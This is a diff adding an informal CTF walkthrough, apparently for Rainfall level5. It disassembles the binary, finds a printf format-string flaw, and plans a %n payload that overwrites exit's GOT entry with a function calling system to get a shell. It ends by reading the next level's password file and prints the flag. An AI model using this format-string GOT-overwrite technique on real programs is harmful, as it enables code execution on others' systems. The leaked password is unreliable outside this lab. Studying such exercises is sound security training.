@@ -1,0 +1,152 @@
+let's start the swotfware
+./level5 
+A
+A
+
+so is just print what i give to 
+
+let's decompile the software:
+gef➤  disassemble n
+Dump of assembler code for function n:
+   0x080484c2 <+0>:     push   ebp
+   0x080484c3 <+1>:     mov    ebp,esp
+   0x080484c5 <+3>:     sub    esp,0x218
+   0x080484cb <+9>:     mov    eax,ds:0x8049848
+   0x080484d0 <+14>:    mov    DWORD PTR [esp+0x8],eax
+   0x080484d4 <+18>:    mov    DWORD PTR [esp+0x4],0x200
+   0x080484dc <+26>:    lea    eax,[ebp-0x208]
+   0x080484e2 <+32>:    mov    DWORD PTR [esp],eax
+   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
+   0x080484ea <+40>:    lea    eax,[ebp-0x208]
+   0x080484f0 <+46>:    mov    DWORD PTR [esp],eax
+   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
+   0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
+   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
+
+
+i look i second function that not called in main so let's decompile it and see what it do:
+
+gef➤  disassemble o
+Dump of assembler code for function o:
+   0x080484a4 <+0>:     push   ebp
+   0x080484a5 <+1>:     mov    ebp,esp
+   0x080484a7 <+3>:     sub    esp,0x18
+   0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0
+   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
+   0x080484b6 <+18>:    mov    DWORD PTR [esp],0x1
+   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
+End of assembler dump.
+
+is look to create a shell and exit the program perfectly
+
+so let's try to break in
+
+
+the idea is to modifiy the addres of exit stored in got table
+
+so let's decomplie the plt process 
+ →  0x80484ff <n+61>           call   0x80483d0 <exit@plt>
+   ↳   0x80483d0 <exit@plt+0>     jmp    DWORD PTR ds:0x8049838
+       0x80483d6 <exit@plt+6>     push   0x28
+       0x80483db <exit@plt+11>    jmp    0x8048370
+       0x80483e0 <__libc_start_main@plt+0> jmp    DWORD PTR ds:0x804983c
+       0x80483e6 <__libc_start_main@plt+6> push   0x30
+       0x80483eb <__libc_start_main@plt+11> jmp    0x8048370
+
+
+if addre to exit exist int got table is jmp
+ to   jmp    DWORD PTR ds:0x8049838 is the addres of exit stored in got table
+
+ other wise is call the function in plt table to finding the addres of exit with ld-linux.so
+
+ and after is call the exit function and modifie the addres of exit in got table
+
+ so let's try to find the addres of exit in got table
+
+so for show function in plt use :
+gef➤  info function plt
+All functions matching regular expression "plt":
+
+Non-debugging symbols:
+0x08048380  printf@plt
+0x08048390  _exit@plt
+0x080483a0  fgets@plt
+0x080483b0  system@plt
+0x080483c0  __gmon_start__@plt
+0x080483d0  exit@plt
+0x080483e0  __libc_start_main@plt
+
+
+so exit@plt is the function we are looking for
+
+gef➤  info variable
+All defined variables:
+
+Non-debugging symbols:
+0x080485e8  _fp_hw
+0x080485ec  _IO_stdin_used
+0x08048734  __FRAME_END__
+0x08049738  __CTOR_LIST__
+0x08049738  __init_array_end
+0x08049738  __init_array_start
+0x0804973c  __CTOR_END__
+0x08049740  __DTOR_LIST__
+0x08049744  __DTOR_END__
+0x08049748  __JCR_END__
+0x08049748  __JCR_LIST__
+0x0804974c  _DYNAMIC
+0x08049818  _GLOBAL_OFFSET_TABLE_
+0x08049840  __data_start
+0x08049840  data_start
+0x08049844  __dso_handle
+0x08049848  stdin
+0x08049848  stdin@@GLIBC_2.0
+0x0804984c  completed
+0x08049850  dtor_idx
+0x08049854  m
+gef➤  info addresse _GLOBAL_OFFSET_TABLE_
+Undefined info command: "addresse _GLOBAL_OFFSET_TABLE_".  Try "help info".
+gef➤  info address _GLOBAL_OFFSET_TABLE_
+Symbol "_GLOBAL_OFFSET_TABLE_" is at 0x8049818 in a file compiled without debugging.
+
+gef➤  x/20wx &_GLOBAL_OFFSET_TABLE_
+0x8049818:	0x0804974c	0x00000000	0x00000000	0x08048386
+0x8049828 <_exit@got.plt>:	0x08048396	0x080483a6	0x080483b6	0x080483c6
+0x8049838 <exit@got.plt>:	0x080483d6	0x080483e6	0x00000000	0x00000000
+0x8049848 <stdin@@GLIBC_2.0>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x8049858:	Cannot access memory at address 0x8049858
+
+
+so you just need to change the addres of exit in got table to the addres of o function
+
+the addres of the function exit int got table is 0x8049838
+
+and the function o is at 0x080484a4
+
+0x080484a4  o
+
+
+sot let's try to get the offset of the printf function 
+
+(base) onyx@onyx:~/IdeaProjects/Rainfall/level5$ python3 -c 'print("AAAA" + " %X" * 50)' | ./Resources/level5
+AAAA 200 F08E4620 340 41414141 20582520 25205825 58252058 20582520 25205825 58252058 20582520 25205825 58252058 20582520 25205825 58252058 20582520 25205825 58252058 20582520 25205825 58252058 20582520 25205825 58252058 20582520 25205825 58252058 20582520 25205825 58252058 20582520 25205825 58252058 20582520 25205825 58252058 20582520 25205825 58252058 20582520 A5825 F0907B00 F0946608 F09189A6 1 1 F090F6D0 27 F090F700
+
+
+so is the 4th argument is exploitable
+
+so let's create the payload
+
+addresse of exit in got table  + value to write  + %4$n
+
+0x8049838 + % 0x080484a4 d - 4 + %4$n
+
+
+so 0x080484a4 is 134513828 in decimal - 4 because il already send with addr
+
+and get the shell
+cat /home/user/level6/.pass
+
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+
+and get the flag !
